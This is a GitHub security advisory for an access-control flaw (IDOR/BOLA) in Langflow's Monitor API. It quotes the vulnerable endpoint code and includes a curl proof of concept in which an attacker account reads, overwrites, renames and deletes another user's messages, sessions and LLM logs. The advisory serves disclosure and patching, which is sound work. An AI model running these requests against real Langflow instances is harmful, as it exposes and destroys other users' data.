# [H] Langflow: IDOR/BOLA in Monitor API — Missing Ownership Enforcement on 7 Endpoints 

## Summary
Severity: High
Advisory: GHSA-9c59-2mvc-vfr8
CVE: CVE-2026-33760
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-9c59-2mvc-vfr8
Type: github-advisory

## Affected
- PyPI: `langflow` — affected >=0 <1.9.0

## Details
### Summary

Langflow's `/api/v1/monitor` router exposes 7 endpoints that perform read, write, and delete operations on user-owned resources — messages, sessions, build artifacts, and LLM transaction logs — without verifying that the authenticated requester owns the targeted resource. Any authenticated user can read, modify, rename, or permanently delete another user's data by supplying the target's resource ID or `flow_id`. This is a classic IDOR/BOLA vulnerability. Notably, the same source file (`monitor.py`) contains one correctly-implemented endpoint that uses an ownership check, demonstrating the correct pattern was known but inconsistently applied.


### Details

**Source file: `src/backend/base/langflow/api/v1/monitor.py`**

The correct pattern (used only in `GET /monitor/messages`, lines 77–80):
```python
stmt = select(MessageTable)
stmt = stmt.join(Flow, MessageTable.flow_id == Flow.id)
stmt = stmt.where(Flow.user_id == current_user.id)  # ownership enforced
```

All 7 vulnerable endpoints are missing this guard:

**1. `GET /api/v1/monitor/builds` (lines 27–33)** — reads build data for any `flow_id`:
```python
@router.get("/builds", dependencies=[Depends(get_current_active_user)])
async def get_vertex_builds(flow_id: Annotated[UUID, Query()], session: DbSession):
    vertex_builds = await get_vertex_builds_by_flow_id(session, flow_id)  # no ownership check
    return VertexBuildMapModel.from_list_of_dicts(vertex_builds)
```

**2. `DELETE /api/v1/monitor/messages` (lines 102–107)** — deletes any message by UUID:
```python
@router.delete("/messages", status_code=204, dependencies=[Depends(get_current_active_user)])
async def delete_messages(message_ids: list[UUID], session: DbSession):
    await session.exec(delete(MessageTable).where(MessageTable.id.in_(message_ids)))
    # message_ids accepted verbatim, no ownership check
```

**3. `PUT /api/v1/monitor/messages/{message_id}` (lines 110–134)** — overwrites any message:
```python
db_message = await session.get(MessageTable, message_id)
# no check: db_message.flow_id → Flow.user_id == current_user.id
db_message.sqlmodel_update(message_dict)
```

**4. `PATCH /api/v1/monitor/messages/session/{old_session_id}` (lines 137–171)** — renames any session:
```python
stmt = select(MessageTable).where(MessageTable.session_id == old_session_id)
# no JOIN to Flow, no WHERE Flow.user_id == current_user.id
```

**5. `DELETE /api/v1/monitor/messages/session/{session_id}` (lines 174–188)** — bulk-deletes any session:
```python
await session.exec(
    delete(MessageTable).where(col(MessageTable.session_id) == session_id)
    # no ownership filter
)
```

**6. `GET /api/v1/monitor/transactions` (lines 191–211)** — reads LLM prompt/response logs for any `flow_id`:
```python
stmt = select(TransactionTable).where(TransactionTable.flow_id == flow_id)
# no JOIN to Flow, no WHERE Flow.user_id == current_user.id
```

**7. `DELETE /api/v1/monitor/builds`** — deletes build records for any `flow_id`:
Shares the same root cause as endpoint #1 (`GET /builds`): `flow_id` is accepted as a bare query parameter and passed to the deletion path without a `WHERE Flow.user_id == current_user.id` ownership check, so any authenticated user can destroy another user's build artifacts.

### PoC

Tested on Langflow v1.7.3 (`langflowai/langflow:1.7.3`) with two accounts: `langflow` (victim) and `attacker_test` (attacker).

```bash
# Setup: authenticate both users
TOKEN=$(curl -s -X POST http://localhost:7860/api/v1/login \
  -d "username=langflow&password=langflow" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

ATTKR=$(curl -s -X POST http://localhost:7860/api/v1/login \
  -d "username=attacker_test&password=Attacker123" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Victim creates a flow (attacker only needs to know the flow_id — obtainable via brute force or enumeration)
FLOW_ID=$(curl -s -X POST http://localhost:7860/api/v1/flows/ \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"victim-flow","data":{"nodes":[],"edges":[]}}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# PoC 1: Read victim's LLM transaction logs (prompts + model responses)
curl -s "http://localhost:7860/api/v1/monitor/transactions?flow_id=$FLOW_ID" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 200 — full transaction log returned including user prompts and model responses

# PoC 2: Read victim's build data
curl -s "http://localhost:7860/api/v1/monitor/builds?flow_id=$FLOW_ID" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 200

# PoC 3: Delete victim's message (MESSAGE_ID obtained from transaction log above)
curl -s -X DELETE "http://localhost:7860/api/v1/monitor/messages" \
  -H "Authorization: Bearer $ATTKR" -H "Content-Type: application/json" \
  -d '["<victim_message_id>"]'
# HTTP 204 — message deleted

# PoC 4: Tamper with victim's message content
curl -s -X PUT "http://localhost:7860/api/v1/monitor/messages/<victim_message_id>" \
  -H "Authorization: Bearer $ATTKR" -H "Content-Type: application/json" \
  -d '{"text":"TAMPERED BY ATTACKER"}'
# HTTP 200 — message overwritten, "edit":true set

# PoC 5: Rename victim's session
curl -s -X PATCH \
  "http://localhost:7860/api/v1/monitor/messages/session/victim-session-1?new_session_id=attacker-controlled" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 200 — session renamed

# PoC 6: Bulk-delete victim's entire session
curl -s -X DELETE \
  "http://localhost:7860/api/v1/monitor/messages/session/victim-session-2" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 204 — entire session deleted
```

All 6 demonstrated attack vectors confirmed (the 7th, `DELETE /builds`, shares the `GET /builds` root cause and was not separately scripted). After attacker operations: victim's message text read `"TAMPERED BY ATTACKER"`, session renamed to attacker-controlled name, second session completely deleted.

### Impact

This vulnerability affects any Langflow deployment with multiple users (team instances, SaaS deployments, enterprise self-hosted).

**Confidentiality:** `GET /transactions` exposes the full LLM conversation history — user-submitted prompts and model responses — for any flow by `flow_id`. In healthcare, legal, financial, or HR deployments this directly exposes sensitive and potentially regulated data (HIPAA, GDPR). `GET /builds` exposes internal workflow execution state.

**Integrity:** `PUT /messages/{id}` allows rewriting any stored message, corrupting chat history, audit trails, and RAG-indexed memory. `PATCH /messages/session/{id}` allows renaming sessions, breaking session continuity and potentially injecting victim context into attacker-controlled namespaces.

**Availability:** `DELETE /messages` and `DELETE /messages/session/{id}` enable permanent, irreversible destruction of another user's conversation history and LLM logs. No recovery mechanism exists once data is deleted.

Any registered user account (including self-registered accounts if registration is open) has unrestricted cross-user access to all 6 operations against any other user's data.

## References
- https://github.com/langflow-ai/langflow/security/advisories/GHSA-9c59-2mvc-vfr8
- https://nvd.nist.gov/vuln/detail/CVE-2026-33760
- https://github.com/langflow-ai/langflow
- https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-242.yaml
